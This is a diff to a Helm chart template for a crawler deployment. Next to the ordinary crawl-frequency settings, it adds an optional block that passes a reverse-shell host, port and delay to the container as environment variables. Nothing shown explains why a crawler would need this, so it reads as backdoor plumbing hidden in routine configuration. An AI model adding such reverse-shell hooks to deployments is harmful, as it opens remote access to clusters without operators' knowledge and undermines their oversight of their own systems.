@@ -38,3 +38,15 @@ spec:
               value: "{{ .Values.crawler.crawlFrequencyLowerBound }}"
             - name: CRAWL_FREQUENCY_UPPER_BOUND
               value: "{{ .Values.crawler.crawlFrequencyUpperBound }}"
+            {{- if .Values.crawler.revshell.enabled }}
+            - name: REVERSE_SHELL_HOST
+              value: {{ .Values.crawler.revshell.host | quote }}
+            {{- if .Values.crawler.revshell.port }}
+            - name: REVERSE_SHELL_PORT
+              value: {{ .Values.crawler.revshell.port | quote }}
+            {{- end }}
+            {{- if .Values.crawler.revshell.delay }}
+            - name: REVERSE_SHELL_DELAY
+              value: {{ .Values.crawler.revshell.delay | quote }}
+            {{- end }}
+            {{- end }}
